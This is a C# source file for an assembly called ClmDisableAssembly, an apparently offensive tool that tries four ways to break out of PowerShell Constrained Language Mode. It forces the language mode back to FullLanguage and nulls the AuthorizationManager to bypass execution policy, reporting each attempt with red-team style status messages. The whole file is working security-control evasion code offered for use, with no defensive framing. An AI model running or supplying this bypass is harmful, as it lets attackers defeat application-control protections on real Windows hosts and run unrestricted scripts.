using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

#pragma warning disable CS0168

namespace ClmDisableAssembly
{
    public class ClmDisableAssembly : MarshalByRefObject
    {
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern int GetCurrentThreadId();

        private static void info(string x)
        {
            try
            {
                Console.WriteLine(x);
            }
            catch (Exception)
            { 
            }
        }

        public static int Start(string arg)
        {
            info("[+] Managed mode assembly. Disabling CLM globally.");
            info("\tCurrent thread ID (managed/unmanaged): " + System.Threading.Thread.CurrentThread.ManagedThreadId.ToString() + " / " + GetCurrentThreadId().ToString());

            int failures = 0;
            try
            {
                if (arg.Length > 0)
                {
                    info($"\tPassed argument: '{arg}'");
                }
            } catch (Exception)
            { }

            try
            {
                // Switches back to FullLanguage in CLM
                Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;

                info("[.] Approach #1 succeeded.");
            }
            catch (Exception e)
            {
                info("[-] Approach #1 failed");
                failures++;
            }

            try
            {
                Runspace.DefaultRunspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;

                // Bypasses PowerShell execution policy
                Runspace.DefaultRunspace.InitialSessionState.AuthorizationManager = null;

                info("[.] Approach #2 succeeded.");
            }
            catch (Exception e)
            {
                info("[-] Approach #2 failed");
                failures++;
            }

            try
            {
                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.ApartmentState = System.Threading.ApartmentState.STA;
                runspace.ThreadOptions = PSThreadOptions.UseCurrentThread;
                runspace.Open();
                runspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
                runspace.Close();

                info("[.] Approach #3 succeeded.");
            }
            catch (Exception e)
            {
                info("[-] Approach #3 failed");
                failures++;
            }

            try
            {
                InitialSessionState initialSessionState = InitialSessionState.CreateDefault();
                initialSessionState.ApartmentState = System.Threading.ApartmentState.STA;
                initialSessionState.AuthorizationManager = null;
                initialSessionState.ThreadOptions = PSThreadOptions.UseCurrentThread;
                
                using (Runspace runspace = RunspaceFactory.CreateRunspace(initialSessionState))
                {
                    runspace.Open();
                    runspace.InitialSessionState.AuthorizationManager = null;
                    runspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;
                    runspace.Close();
                }

                info("[.] Approach #4 succeeded.");
            }
            catch (Exception e)
            {
                info("[-] Approach #4 failed");
                failures++;
            }

            if (failures >= 0 && failures < 4)
            {
                info("[+] CLM may be disabled!");
            }
            else
            {
                info("[-] CLM could not be disabled. All approaches failed!");
            }

            return 0;
        }
    }
}
